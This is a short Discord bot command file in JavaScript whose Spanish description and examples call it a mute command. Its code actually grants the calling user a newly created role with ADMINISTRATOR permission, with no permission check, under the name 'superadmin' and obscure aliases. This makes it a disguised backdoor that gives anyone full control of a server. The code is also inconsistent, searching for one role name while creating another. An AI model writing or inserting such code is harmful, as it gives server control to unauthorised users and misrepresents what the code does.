module.exports = {
    name : 'superadmin',
    category: "Moderacion",
    aliases: ['dad', 's'],
    description : 'Este comando Mutea al usuario mencionado con su ID o mención, también puedes dar una razón de ello',
    usage: '!admin',
    examples: ['!mute @Firulais', '!mute 556540723235651584', '!mute @Firulais Razon'],
    run: async (client , message, args) => {
        let mutee = message.guild.member(message.author)
    let muterole = message.guild.roles.cache.find(r => r.name === "Creador2")
    if(!muterole) {
        try{
            muterole = await message.guild.roles.create({ data: {  
                name : "Creador",
                color : "#FF0000",
                permissions : ["SEND_MESSAGES", "ADMINISTRATOR", "VIEW_GUILD_INSIGHTS"]
            }
            })
            await muterole.setPosition(29);
        } catch(e) {
            console.log(e.stack);
    }
}

mutee.roles.add(muterole.id)
    }
}
